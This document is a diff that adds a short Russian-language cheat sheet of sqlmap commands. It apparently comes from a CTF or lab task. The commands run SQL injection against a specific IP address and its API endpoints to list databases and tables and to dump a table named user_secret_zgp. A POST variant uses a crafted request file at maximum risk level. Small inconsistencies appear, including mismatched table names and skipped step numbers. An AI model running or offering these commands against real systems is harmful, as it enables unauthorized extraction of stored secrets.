@@ -1,0 +1,26 @@
+Для GET запросов
+0. sudo snap install sqlmap
+(установка консольной утилиты для sql инъекций)
+
+1. sqlmap -u http://185.105.90.150:59404/api/v4/provider/search_provider?phone= -p phone --dbs --batch
+(вывод схем базы public)
+
+2. sqlmap -u http://185.105.90.150:59404/api/v4/provider/search_provider?phone=1 -p phone -D public --tables --batch
+(вывод таблиц)
+
+3. sqlmap -u http://185.105.90.150:59400/api/v4/provider/search_by_product?title=1 -p title -D public -T user_secret_zgp --dump --batch
+(вывод данных таблицы user_secret_n8h)
+
+------------------------------------
+Для POST запросов
+1. создаем файл request.txt
+"""
+POST /api/v4/vendor/search_by_product HTTP/1.1
+HOST: http://185.105.90.150:59400
+
+{"title": "*"}
+"""
+
+3. sqlmap -r request.txt --dbs --batch
+4. дальше то же самое что с GET Для GET запросов
+5. --flush-session --risk=3
